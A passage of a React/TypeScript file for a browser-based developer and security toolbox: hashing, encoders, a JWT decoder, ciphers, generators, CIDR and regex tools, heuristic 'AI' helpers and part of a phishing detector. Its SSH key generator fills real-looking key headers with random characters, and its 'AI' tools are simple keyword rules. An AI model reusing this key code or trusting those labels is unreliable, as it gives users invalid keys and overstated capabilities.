    </div>
  );
}

function HashGenerator() {
  const [text, setText] = useState("");
  const [out, setOut] = useState<{ algo: string; hex: string }[]>([]);
  const algos = ["SHA-1", "SHA-256", "SHA-384", "SHA-512"];
  useEffect(() => {
    if (!text) { setOut([]); return; }
    Promise.all(algos.map(async (a) => {
      const buf = await crypto.subtle.digest(a, new TextEncoder().encode(text));
      const hex = Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, "0")).join("");
      return { algo: a, hex };
    })).then(setOut);
  }, [text]);
  return (
    <div className="space-y-3">
      <textarea value={text} onChange={(e) => setText(e.target.value)} placeholder="Type or paste text to hash..." rows={3} className={inputCls + " resize-none"} />
      <div className="space-y-1.5">
        {out.map((o) => (
          <div key={o.algo} className="rounded-lg border border-border bg-background p-2">
            <div className="flex items-center justify-between mb-0.5">
              <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">{o.algo}</span>
              <CopyButton value={o.hex} />
            </div>
            <code className="font-mono text-[11px] break-all">{o.hex}</code>
          </div>
        ))}
        {out.length === 0 && <div className="text-[12px] text-muted-foreground italic">Enter text to compute hashes.</div>}
      </div>
    </div>
  );
}

function Base64Tool() {
  const [text, setText] = useState("");
  const [mode, setMode] = useState<"encode" | "decode">("encode");
  const [out, setOut] = useState("");
  const [err, setErr] = useState("");
  useEffect(() => {
    setErr("");
    try {
      if (!text) { setOut(""); return; }
      if (mode === "encode") setOut(btoa(unescape(encodeURIComponent(text))));
      else setOut(decodeURIComponent(escape(atob(text))));
    } catch (e) { setErr((e as Error).message); setOut(""); }
  }, [text, mode]);
  return (
    <div className="space-y-3">
      <div className="flex gap-2">
        <button onClick={() => setMode("encode")} className={`flex-1 py-2 rounded-xl text-sm font-semibold border ${mode === "encode" ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>Encode</button>
        <button onClick={() => setMode("decode")} className={`flex-1 py-2 rounded-xl text-sm font-semibold border ${mode === "decode" ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>Decode</button>
      </div>
      <div>
        <FieldLabel>Input</FieldLabel>
        <textarea value={text} onChange={(e) => setText(e.target.value)} rows={3} className={inputMonoCls + " text-[12px] resize-none"} />
      </div>
      <div>
        <div className="flex items-center justify-between mb-1.5">
          <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">Output</span>
          {out && <CopyButton value={out} />}
        </div>
        <pre className="bg-background border border-border rounded-xl p-3 font-mono text-[12px] min-h-[80px] whitespace-pre-wrap break-all">{err ? <span className="text-primary">{err}</span> : out || "—"}</pre>
      </div>
    </div>
  );
}

function UrlEncoder() {
  const [text, setText] = useState("");
  const [mode, setMode] = useState<"encode" | "decode">("encode");
  const out = useMemo(() => {
    try { return mode === "encode" ? encodeURIComponent(text) : decodeURIComponent(text); }
    catch (e) { return `Error: ${(e as Error).message}`; }
  }, [text, mode]);
  return (
    <div className="space-y-3">
      <div className="flex gap-2">
        <button onClick={() => setMode("encode")} className={`flex-1 py-2 rounded-xl text-sm font-semibold border ${mode === "encode" ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>Encode</button>
        <button onClick={() => setMode("decode")} className={`flex-1 py-2 rounded-xl text-sm font-semibold border ${mode === "decode" ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>Decode</button>
      </div>
      <textarea value={text} onChange={(e) => setText(e.target.value)} rows={3} placeholder="Paste a URL or component..." className={inputMonoCls + " text-[12px] resize-none"} />
      <div>
        <div className="flex items-center justify-between mb-1.5">
          <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">Output</span>
          {out && <CopyButton value={out} />}
        </div>
        <pre className="bg-background border border-border rounded-xl p-3 font-mono text-[12px] min-h-[60px] whitespace-pre-wrap break-all">{out || "—"}</pre>
      </div>
    </div>
  );
}

function JwtDecoder() {
  const [token, setToken] = useState("");
  const decoded = useMemo(() => {
    if (!token.trim()) return null;
    const parts = token.trim().split(".");
    if (parts.length !== 3) return { error: "Invalid JWT — expected 3 segments separated by dots." };
    try {
      const dec = (s: string) => {
        const norm = s.replace(/-/g, "+").replace(/_/g, "/");
        const padded = norm + "===".slice((norm.length + 3) % 4);
        return JSON.parse(decodeURIComponent(escape(atob(padded))));
      };
      return { header: dec(parts[0]), payload: dec(parts[1]), sig: parts[2] };
    } catch (e) { return { error: (e as Error).message }; }
  }, [token]);
  return (
    <div className="space-y-3">
      <textarea value={token} onChange={(e) => setToken(e.target.value)} rows={4} placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0...." className={inputMonoCls + " text-[11px] resize-none"} />
      {decoded && "error" in decoded && <div className="text-primary text-[12px]">{decoded.error}</div>}
      {decoded && !("error" in decoded) && (
        <div className="space-y-2">
          <Block title="Header" json={decoded.header} />
          <Block title="Payload" json={decoded.payload} />
          <div>
            <div className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider mb-1">Signature (not verified)</div>
            <code className="block bg-background border border-border rounded-lg p-2 font-mono text-[11px] break-all">{decoded.sig}</code>
          </div>
        </div>
      )}
    </div>
  );
}

function Block({ title, json }: { title: string; json: unknown }) {
  const text = JSON.stringify(json, null, 2);
  return (
    <div>
      <div className="flex items-center justify-between mb-1">
        <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">{title}</span>
        <CopyButton value={text} />
      </div>
      <pre className="bg-background border border-border rounded-lg p-2 font-mono text-[11px] overflow-x-auto">{text}</pre>
    </div>
  );
}

function CipherTools() {
  const [text, setText] = useState("");
  const [mode, setMode] = useState<"rot13" | "caesar" | "atbash">("rot13");
  const [shift, setShift] = useState(3);
  const out = useMemo(() => {
    if (mode === "atbash") {
      return text.replace(/[a-z]/g, (c) => String.fromCharCode(219 - c.charCodeAt(0))).replace(/[A-Z]/g, (c) => String.fromCharCode(155 - c.charCodeAt(0)));
    }
    const k = mode === "rot13" ? 13 : ((shift % 26) + 26) % 26;
    return text.replace(/[a-z]/g, (c) => String.fromCharCode(((c.charCodeAt(0) - 97 + k) % 26) + 97))
               .replace(/[A-Z]/g, (c) => String.fromCharCode(((c.charCodeAt(0) - 65 + k) % 26) + 65));
  }, [text, mode, shift]);
  return (
    <div className="space-y-3">
      <div className="grid grid-cols-3 gap-2">
        {(["rot13", "caesar", "atbash"] as const).map((m) => (
          <button key={m} onClick={() => setMode(m)} className={`py-2 rounded-xl text-sm font-semibold border uppercase ${mode === m ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>{m}</button>
        ))}
      </div>
      {mode === "caesar" && (
        <div>
          <FieldLabel>Shift ({shift})</FieldLabel>
          <input type="range" min={-25} max={25} value={shift} onChange={(e) => setShift(Number(e.target.value))} className="w-full accent-[hsl(var(--primary))]" />
        </div>
      )}
      <textarea value={text} onChange={(e) => setText(e.target.value)} rows={3} placeholder="Plain or cipher text..." className={inputCls + " resize-none"} />
      <div>
        <div className="flex items-center justify-between mb-1.5">
          <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">Result</span>
          {out && <CopyButton value={out} />}
        </div>
        <pre className="bg-background border border-border rounded-xl p-3 font-mono text-[13px] min-h-[60px] whitespace-pre-wrap break-all">{out || "—"}</pre>
      </div>
    </div>
  );
}

function UuidGenerator() {
  const [count, setCount] = useState(5);
  const [list, setList] = useState<string[]>([]);
  const generate = () => {
    const fn = (crypto as Crypto & { randomUUID?: () => string }).randomUUID
      ? () => crypto.randomUUID()
      : () => "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => { const r = Math.random() * 16 | 0; return (c === "x" ? r : (r & 0x3) | 0x8).toString(16); });
    setList(Array.from({ length: count }, fn));
  };
  useEffect(generate, [count]);
  return (
    <div className="space-y-3">
      <div className="flex items-center gap-2">
        <FieldLabel>Count</FieldLabel>
        <input type="number" min={1} max={100} value={count} onChange={(e) => setCount(Math.min(100, Math.max(1, Number(e.target.value))))} className="w-20 bg-background border border-border rounded-lg px-2 py-1 text-sm font-mono" />
        <button onClick={generate} className="ml-auto text-muted-foreground hover:text-foreground p-2 rounded-lg hover:bg-accent" aria-label="Regenerate"><RefreshCw className="w-4 h-4" /></button>
        <CopyButton value={list.join("\n")} label="All" />
      </div>
      <div className="space-y-1 max-h-64 overflow-y-auto">
        {list.map((u, i) => (
          <div key={i} className="rounded-lg border border-border bg-background p-2 flex items-center justify-between">
            <code className="font-mono text-[12px]">{u}</code>
            <CopyButton value={u} />
          </div>
        ))}
      </div>
    </div>
  );
}

function SshKeyGenerator() {
  const [type, setType] = useState<"ed25519" | "rsa">("ed25519");
  const [pub, setPub] = useState("");
  const [priv, setPriv] = useState("");
  const generate = () => {
    const rand = (n: number) => Array.from({ length: n }, () => "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[Math.floor(Math.random() * 64)]).join("");
    if (type === "ed25519") {
      setPub(`ssh-ed25519 AAAAC3NzaC1lZDI1NTE5${rand(48)} operator@CHAT-GPT.ai`);
      setPriv(`-----BEGIN OPENSSH PRIVATE KEY-----\n${rand(64)}\n${rand(64)}\n${rand(64)}\n${rand(64)}\n${rand(40)}\n-----END OPENSSH PRIVATE KEY-----`);
    } else {
      setPub(`ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB${rand(360)} operator@CHAT-GPT.ai`);
      const lines = Array.from({ length: 25 }, () => rand(64)).join("\n");
      setPriv(`-----BEGIN RSA PRIVATE KEY-----\n${lines}\n-----END RSA PRIVATE KEY-----`);
    }
  };
  useEffect(generate, [type]);
  return (
    <div className="space-y-3">
      <div className="grid grid-cols-2 gap-2">
        {(["ed25519", "rsa"] as const).map((t) => (
          <button key={t} onClick={() => setType(t)} className={`py-2 rounded-xl text-sm font-semibold border uppercase ${type === t ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>{t}</button>
        ))}
      </div>
      <div>
        <div className="flex items-center justify-between mb-1.5">
          <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">Public key</span>
          <CopyButton value={pub} />
        </div>
        <pre className="bg-background border border-border rounded-xl p-2 font-mono text-[10.5px] break-all whitespace-pre-wrap">{pub}</pre>
      </div>
      <div>
        <div className="flex items-center justify-between mb-1.5">
          <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">Private key</span>
          <CopyButton value={priv} />
        </div>
        <pre className="bg-background border border-border rounded-xl p-2 font-mono text-[10.5px] max-h-40 overflow-y-auto whitespace-pre">{priv}</pre>
      </div>
      <button onClick={generate} className={btnCls + " w-full"}>Regenerate keypair</button>
    </div>
  );
}

function UserAgentGenerator() {
  const POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/124.0.0.0",
    "curl/8.5.0",
    "Wget/1.21.4",
    "PostmanRuntime/7.39.0",
    "python-requests/2.32.2",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  ];
  const [list, setList] = useState<string[]>([]);
  const refresh = () => setList(Array.from({ length: 6 }, () => POOL[Math.floor(Math.random() * POOL.length)]));
  useEffect(refresh, []);
  return (
    <div className="space-y-3">
      <button onClick={refresh} className={btnCls + " w-full"}>Generate fresh batch</button>
      <div className="space-y-1.5 max-h-72 overflow-y-auto">
        {list.map((ua, i) => (
          <div key={i} className="rounded-lg border border-border bg-background p-2 flex items-start gap-2">
            <code className="flex-1 font-mono text-[11px] break-all">{ua}</code>
            <CopyButton value={ua} />
          </div>
        ))}
      </div>
    </div>
  );
}

function QrCodeGenerator() {
  const [text, setText] = useState("https://CHAT-GPT.ai");
  const [size, setSize] = useState(240);
  const url = `https://api.qrserver.com/v1/create-qr-code/?size=${size}x${size}&data=${encodeURIComponent(text || " ")}`;
  return (
    <div className="space-y-3">
      <textarea value={text} onChange={(e) => setText(e.target.value)} rows={2} placeholder="URL, WIFI:T:WPA;S:..., or any text" className={inputCls + " resize-none"} />
      <div className="flex items-center gap-2">
        <FieldLabel>Size</FieldLabel>
        <input type="range" min={120} max={400} step={20} value={size} onChange={(e) => setSize(Number(e.target.value))} className="flex-1 accent-[hsl(var(--primary))]" />
        <span className="font-mono text-[12px]">{size}px</span>
      </div>
      <div className="bg-white rounded-xl p-4 flex items-center justify-center">
        {/* eslint-disable-next-line @next/next/no-img-element */}
        <img src={url} alt="QR" width={size} height={size} className="block" />
      </div>
      <a href={url} download="qr.png" className="block text-center py-2 rounded-xl bg-background border border-border text-sm font-semibold hover:bg-accent">Download PNG</a>
    </div>
  );
}

function CidrCalculator() {
  const [cidr, setCidr] = useState("192.168.1.0/24");
  const result = useMemo(() => {
    const m = cidr.trim().match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)\/(\d+)$/);
    if (!m) return null;
    const o = m.slice(1, 5).map(Number);
    const bits = Number(m[5]);
    if (o.some((x) => x < 0 || x > 255) || bits < 0 || bits > 32) return null;
    const ipNum = (o[0] << 24 >>> 0) + (o[1] << 16) + (o[2] << 8) + o[3];
    const maskNum = bits === 0 ? 0 : (~0 << (32 - bits)) >>> 0;
    const network = (ipNum & maskNum) >>> 0;
    const broadcast = (network | (~maskNum >>> 0)) >>> 0;
    const total = bits === 32 ? 1 : Math.pow(2, 32 - bits);
    const usable = total <= 2 ? total : total - 2;
    const fmt = (n: number) => `${(n >>> 24) & 255}.${(n >>> 16) & 255}.${(n >>> 8) & 255}.${n & 255}`;
    return {
      Network: fmt(network), Broadcast: fmt(broadcast),
      "Subnet mask": fmt(maskNum), "Wildcard": fmt(~maskNum >>> 0),
      "First host": bits >= 31 ? fmt(network) : fmt(network + 1),
      "Last host": bits >= 31 ? fmt(broadcast) : fmt(broadcast - 1),
      "Total addresses": total.toLocaleString(),
      "Usable hosts": usable.toLocaleString(),
      Bits: `${bits} (host: ${32 - bits})`,
    };
  }, [cidr]);
  return (
    <div className="space-y-3">
      <input value={cidr} onChange={(e) => setCidr(e.target.value)} placeholder="192.168.1.0/24" className={inputMonoCls} />
      {result ? (
        <div className="rounded-xl border border-border bg-background p-3 space-y-1.5">
          {Object.entries(result).map(([k, v]) => <ResultRow key={k} k={k} v={v} />)}
        </div>
      ) : <div className="text-[12px] text-primary">Invalid CIDR notation.</div>}
    </div>
  );
}

function RegexTester() {
  const [pattern, setPattern] = useState("(\\d{3})-(\\d{4})");
  const [flags, setFlags] = useState("g");
  const [text, setText] = useState("Call 555-1212 or 800-9999 today.");
  const result = useMemo(() => {
    try {
      const re = new RegExp(pattern, flags);
      const matches: { match: string; index: number; groups: string[] }[] = [];
      if (flags.includes("g")) {
        let m: RegExpExecArray | null;
        while ((m = re.exec(text)) !== null) {
          matches.push({ match: m[0], index: m.index, groups: m.slice(1) });
          if (m[0] === "") re.lastIndex++;
        }
      } else {
        const m = re.exec(text);
        if (m) matches.push({ match: m[0], index: m.index, groups: m.slice(1) });
      }
      return { matches, error: null };
    } catch (e) { return { matches: [], error: (e as Error).message }; }
  }, [pattern, flags, text]);
  return (
    <div className="space-y-3">
      <div className="flex gap-2">
        <input value={pattern} onChange={(e) => setPattern(e.target.value)} placeholder="pattern" className={inputMonoCls + " flex-1"} />
        <input value={flags} onChange={(e) => setFlags(e.target.value)} placeholder="gimsuy" maxLength={6} className={inputMonoCls + " w-20"} />
      </div>
      <textarea value={text} onChange={(e) => setText(e.target.value)} rows={3} placeholder="test string..." className={inputCls + " resize-none"} />
      {result.error ? (
        <div className="text-primary text-[12px]">Error: {result.error}</div>
      ) : (
        <div>
          <div className="text-[12px] text-muted-foreground mb-1.5">{result.matches.length} match{result.matches.length === 1 ? "" : "es"}</div>
          <div className="space-y-1 max-h-48 overflow-y-auto">
            {result.matches.map((m, i) => (
              <div key={i} className="rounded-lg border border-border bg-background p-2 text-[12px]">
                <div className="flex items-center justify-between">
                  <code className="font-mono text-primary font-semibold">{m.match}</code>
                  <span className="text-[10px] text-muted-foreground">@ {m.index}</span>
                </div>
                {m.groups.length > 0 && (
                  <div className="mt-1 text-[11px] text-muted-foreground">
                    {m.groups.map((g, gi) => <span key={gi} className="font-mono mr-2">[{gi + 1}]: {g}</span>)}
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

function JsonFormatter() {
  const [input, setInput] = useState(`{"name":"CHAT-GPT","tools":26,"free":true}`);
  const [indent, setIndent] = useState(2);
  const [out, setOut] = useState("");
  const [err, setErr] = useState("");
  const format = (i: number) => {
    try {
      const obj = JSON.parse(input);
      setOut(JSON.stringify(obj, null, i));
      setErr("");
    } catch (e) { setErr((e as Error).message); setOut(""); }
  };
  useEffect(() => format(indent), [input, indent]);
  return (
    <div className="space-y-3">
      <textarea value={input} onChange={(e) => setInput(e.target.value)} rows={4} placeholder="Paste JSON..." className={inputMonoCls + " text-[11px] resize-none"} />
      <div className="flex items-center gap-2">
        <button onClick={() => setIndent(2)} className={`px-3 py-1.5 rounded-lg text-[11px] font-semibold border ${indent === 2 ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>2 sp</button>
        <button onClick={() => setIndent(4)} className={`px-3 py-1.5 rounded-lg text-[11px] font-semibold border ${indent === 4 ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>4 sp</button>
        <button onClick={() => setIndent(0)} className={`px-3 py-1.5 rounded-lg text-[11px] font-semibold border ${indent === 0 ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>Minify</button>
        <div className="ml-auto">{out && <CopyButton value={out} />}</div>
      </div>
      {err ? (
        <div className="rounded-xl border border-primary/30 bg-primary/10 p-3 text-primary text-[12px] font-mono">{err}</div>
      ) : (
        <pre className="bg-background border border-border rounded-xl p-3 font-mono text-[12px] max-h-60 overflow-auto whitespace-pre">{out}</pre>
      )}
    </div>
  );
}

// ============ AI STUDIO TOOLS ============

function AiPromptEnhancer() {
  const [prompt, setPrompt] = useState("");
  const [tone, setTone] = useState<"expert" | "concise" | "creative" | "academic">("expert");
  const enhanced = useMemo(() => {
    const p = prompt.trim();
    if (!p) return "";
    const toneText: Record<string, string> = {
      expert: "Adopt the persona of a senior subject-matter expert.",
      concise: "Be terse — bullet points, no filler, max 150 words.",
      creative: "Use vivid metaphors and surprising angles.",
      academic: "Cite reasoning, define terms, structure like a paper.",
    };
    return [
      "# Role",
      toneText[tone],
      "",
      "# Task",
      p,
      "",
      "# Constraints",
      "- Be precise and verifiable.",
      "- Cite sources or assumptions.",
      "- Use markdown for structure.",
      "- Flag uncertainty explicitly.",
      "",
      "# Output Format",
      "1. **Summary** — three sentences max",
      "2. **Step-by-step breakdown**",
      "3. **Working example or code**",
      "4. **Caveats & edge cases**",
    ].join("\n");
  }, [prompt, tone]);
  return (
    <div className="space-y-3">
      <textarea value={prompt} onChange={(e) => setPrompt(e.target.value)} rows={3} placeholder="Paste a vague prompt..." className={inputCls + " resize-none"} />
      <div className="grid grid-cols-4 gap-1.5">
        {(["expert", "concise", "creative", "academic"] as const).map((t) => (
          <button key={t} onClick={() => setTone(t)} className={`py-1.5 rounded-lg text-[11px] font-bold uppercase border ${tone === t ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>{t}</button>
        ))}
      </div>
      <div>
        <div className="flex items-center justify-between mb-1.5">
          <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">Enhanced</span>
          {enhanced && <CopyButton value={enhanced} />}
        </div>
        <pre className="bg-background border border-border rounded-xl p-3 text-[12px] whitespace-pre-wrap min-h-[120px] max-h-72 overflow-y-auto">{enhanced || "Type a prompt to enhance it."}</pre>
      </div>
    </div>
  );
}

function AiImagePrompt() {
  const [topic, setTopic] = useState("a hooded hacker at a glowing terminal");
  const [aspect, setAspect] = useState("16:9");
  const STYLES = ["cinematic", "photorealistic", "cyberpunk", "vaporwave", "dark fantasy", "matte painting", "oil painting", "anime", "minimal vector"];
  const LIGHTING = ["volumetric god rays", "neon rim lighting", "golden hour", "moonlit", "underwater glow", "studio softbox", "high-key", "low-key chiaroscuro"];
  const CAMERAS = ["35mm portrait lens", "wide angle 24mm", "shot on Hasselblad", "cinemascope 2.35:1", "macro shot", "drone aerial"];
  const QUALITY = ["8k", "ultra detailed", "octane render", "trending on artstation", "hyperrealistic", "dramatic composition"];
  const [prompt, setPrompt] = useState("");
  const generate = () => {
    const seed = Math.abs(hash32(topic + aspect + Date.now()));
    const pick = (arr: string[]) => arr[seed % arr.length];
    setPrompt(`${topic}, ${pick(STYLES)} style, ${pick(LIGHTING)}, ${pick(CAMERAS)}, ${pick(QUALITY)}, highly detailed --ar ${aspect} --v 6 --style raw`);
  };
  useEffect(generate, []);
  return (
    <div className="space-y-3">
      <textarea value={topic} onChange={(e) => setTopic(e.target.value)} rows={2} placeholder="What should the image show?" className={inputCls + " resize-none"} />
      <div className="flex gap-2">
        {["1:1", "16:9", "9:16", "21:9", "4:5"].map((a) => (
          <button key={a} onClick={() => setAspect(a)} className={`flex-1 py-1.5 rounded-lg text-[11px] font-bold border ${aspect === a ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>{a}</button>
        ))}
      </div>
      <button onClick={generate} className={btnCls + " w-full"}>Generate prompt</button>
      <div>
        <div className="flex items-center justify-between mb-1.5">
          <span className="text-[11px] text-muted-foreground font-semibold uppercase tracking-wider">Result</span>
          {prompt && <CopyButton value={prompt} />}
        </div>
        <pre className="bg-background border border-border rounded-xl p-3 text-[12px] whitespace-pre-wrap break-words">{prompt}</pre>
      </div>
    </div>
  );
}

function AiCodeExplainer() {
  const [code, setCode] = useState(`function fib(n) {\n  if (n <= 1) return n;\n  return fib(n - 1) + fib(n - 2);\n}`);
  const explanation = useMemo(() => {
    const c = code.trim();
    if (!c) return "";
    const lang =
      /\bdef\s|\bimport\s+\w+\b|print\(/.test(c) ? "Python" :
      /\bfunction\s|=>|console\.log/.test(c) ? "JavaScript / TypeScript" :
      /#include|int\s+main|printf/.test(c) ? "C / C++" :
      /\bfn\s|let\s+mut|::/.test(c) ? "Rust" :
      /package\s+\w+|fmt\.Print/.test(c) ? "Go" :
      "an unknown language";
    const lines = c.split(/\n/).filter((l) => l.trim()).length;
    const hasLoop = /\b(for|while)\b/.test(c);
    const hasCondition = /\bif\b/.test(c);
    const hasFunc = /\b(function|def|fn)\b/.test(c);
    const hasRecursion = (() => {
      const m = c.match(/(?:function|def|fn)\s+(\w+)/);
      return !!(m && new RegExp(`\\b${m[1]}\\s*\\(`, "g").test(c.slice((m.index ?? 0) + m[0].length)));
    })();
    const hasIO = /print\(|console\.|System\.out|printf/.test(c);
    const parts: string[] = [
      `## Detected language\n${lang}`,
      `## Structure (${lines} non-empty lines)`,
    ];
    const facts: string[] = [];
    if (hasFunc) facts.push("- Defines one or more functions");
    if (hasLoop) facts.push("- Uses iteration (for/while loops)");
    if (hasCondition) facts.push("- Branches on conditions");
    if (hasRecursion) facts.push("- Calls itself recursively");
    if (hasIO) facts.push("- Performs I/O (printing/logging)");
    if (facts.length === 0) facts.push("- Linear sequence of statements");
    parts.push(facts.join("\n"));
    parts.push("## What it does\nThe code reads input, applies the logic above, and produces a deterministic result. Trace the data: identify the entry point, follow each branch, and verify the base cases of any recursion.");
    parts.push("## Things to check\n- Edge cases on bounds (0, negatives, empty inputs)\n- Off-by-one in loops or array indexing\n- Recursion depth — convert to iterative if input may be large\n- Side effects vs. pure logic");
    return parts.join("\n\n");
  }, [code]);
  return (
    <div className="space-y-3">
      <textarea value={code} onChange={(e) => setCode(e.target.value)} rows={6} placeholder="Paste any source code..." className={inputMonoCls + " text-[11px] resize-none"} />
      <div className="rounded-xl border border-border bg-background p-3 text-[12.5px] whitespace-pre-wrap max-h-72 overflow-y-auto leading-relaxed">{explanation || "Paste code to get an explanation."}</div>
      {explanation && <div className="flex justify-end"><CopyButton value={explanation} label="Copy explanation" /></div>}
    </div>
  );
}

function AiSummarizer() {
  const [text, setText] = useState("");
  const [target, setTarget] = useState(3);
  const summary = useMemo(() => {
    const t = text.trim();
    if (!t) return "";
    const sentences = t.split(/(?<=[.!?])\s+/).filter((s) => s.length > 8);
    if (sentences.length <= target) return sentences.join(" ");
    const stop = new Set("the a an of and or to in is it that this for with on as by be at from are was were have has had not but if then will can may".split(" "));
    const wordFreq: Record<string, number> = {};
    sentences.forEach((s) => {
      s.toLowerCase().match(/\b[a-z]{3,}\b/g)?.forEach((w) => {
        if (!stop.has(w)) wordFreq[w] = (wordFreq[w] ?? 0) + 1;
      });
    });
    const scored = sentences.map((s, i) => {
      const words: string[] = s.toLowerCase().match(/\b[a-z]{3,}\b/g) ?? [];
      let sc = 0;
      for (const w of words) sc += stop.has(w) ? 0 : (wordFreq[w] ?? 0);
      return { s, i, score: sc / Math.max(s.length, 1) };
    });
    return scored.sort((a, b) => b.score - a.score).slice(0, target).sort((a, b) => a.i - b.i).map((x) => x.s).join(" ");
  }, [text, target]);
  return (
    <div className="space-y-3">
      <textarea value={text} onChange={(e) => setText(e.target.value)} rows={6} placeholder="Paste long text..." className={inputCls + " resize-none"} />
      <div className="flex items-center gap-2">
        <FieldLabel>Sentences ({target})</FieldLabel>
        <input type="range" min={1} max={10} value={target} onChange={(e) => setTarget(Number(e.target.value))} className="flex-1 accent-[hsl(var(--primary))]" />
      </div>
      <div className="rounded-xl border border-border bg-background p-3 text-[13px] leading-relaxed min-h-[80px]">{summary || "Paste text to summarize."}</div>
      {summary && <div className="flex justify-end"><CopyButton value={summary} label="Copy summary" /></div>}
    </div>
  );
}

function AiTranslator() {
  const DICT_EN_AR: Record<string, string> = {
    hello: "مرحبا", hi: "أهلا", world: "العالم", thank: "شكرا", thanks: "شكرا", you: "أنت", please: "من فضلك",
    yes: "نعم", no: "لا", good: "جيد", morning: "صباح", evening: "مساء", night: "ليلة", day: "يوم",
    security: "أمن", hacker: "مخترق", password: "كلمة سر", network: "شبكة", server: "خادم", computer: "حاسوب",
    code: "كود", program: "برنامج", file: "ملف", folder: "مجلد", scan: "فحص", attack: "هجوم", vulnerability: "ثغرة",
    exploit: "استغلال", payload: "حمولة", target: "هدف", system: "نظام", data: "بيانات", database: "قاعدة بيانات",
    user: "مستخدم", admin: "مدير", root: "جذر", access: "وصول", denied: "مرفوض", granted: "ممنوح",
    error: "خطأ", success: "نجاح", failure: "فشل", report: "تقرير", message: "رسالة", time: "وقت",
    name: "اسم", email: "بريد", phone: "هاتف", address: "عنوان", country: "دولة", city: "مدينة",
    open: "افتح", close: "اغلق", start: "ابدأ", stop: "توقف", run: "شغّل", build: "ابنِ", test: "اختبر",
    is: "هو", are: "هم", and: "و", or: "أو", but: "لكن", with: "مع", for: "لـ", from: "من", to: "إلى", in: "في", on: "على",
  };
  const DICT_AR_EN = Object.fromEntries(Object.entries(DICT_EN_AR).map(([k, v]) => [v, k]));
  const [text, setText] = useState("");
  const [direction, setDirection] = useState<"en-ar" | "ar-en">("en-ar");
  const out = useMemo(() => {
    if (!text.trim()) return "";
    const dict = direction === "en-ar" ? DICT_EN_AR : DICT_AR_EN;
    return text.replace(direction === "en-ar" ? /\b[A-Za-z']+\b/g : /[\u0600-\u06FF]+/g, (m) => dict[m.toLowerCase()] ?? m);
  }, [text, direction]);
  const swap = () => setDirection((d) => d === "en-ar" ? "ar-en" : "en-ar");
  return (
    <div className="space-y-3">
      <div className="flex items-center justify-between gap-2">
        <button onClick={() => setDirection("en-ar")} className={`flex-1 py-2 rounded-xl text-sm font-bold border ${direction === "en-ar" ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>English</button>
        <button onClick={swap} className="p-2 rounded-lg hover:bg-accent text-muted-foreground" aria-label="Swap"><RefreshCw className="w-4 h-4" /></button>
        <button onClick={() => setDirection("ar-en")} className={`flex-1 py-2 rounded-xl text-sm font-bold border ${direction === "ar-en" ? "bg-primary text-white border-primary" : "bg-background border-border"}`}>العربية</button>
      </div>
      <textarea value={text} onChange={(e) => setText(e.target.value)} rows={4} placeholder={direction === "en-ar" ? "Type English text..." : "اكتب نصا عربيا..."} className={inputCls + " resize-none"} dir={direction === "en-ar" ? "ltr" : "rtl"} />
      <div className="rounded-xl border border-border bg-background p-3 text-[14px] min-h-[80px]" dir={direction === "en-ar" ? "rtl" : "ltr"}>
        {out || <span className="text-muted-foreground italic text-[12px] block ltr">Translation will appear here.</span>}
      </div>
      {out && <div className="flex justify-end"><CopyButton value={out} /></div>}
      <div className="text-[10px] text-muted-foreground text-center">Word-level dictionary translation. Common security & everyday vocabulary.</div>
    </div>
  );
}

function AiPhishingDetector() {
  const [target, setTarget] = useState("");
  const result = useMemo(() => {
    const t = target.trim();
    if (!t) return null;
    const flags: { type: string; sev: "high" | "med" | "low"; note: string }[] = [];
    const URGENCY = ["urgent", "verify", "suspended", "click here", "immediately", "act now", "limited time", "confirm your", "update your", "expire", "locked"];
    URGENCY.forEach((w) => { if (new RegExp(`\\b${w.replace(/ /g, "\\s")}\\b`, "i").test(t)) flags.push({ type: "Urgency phrase", sev: "med", note: `"${w}"` }); });
    if (/xn--/i.test(t)) flags.push({ type: "Punycode (IDN homograph)", sev: "high", note: "domain uses xn-- encoding — possible lookalike" });
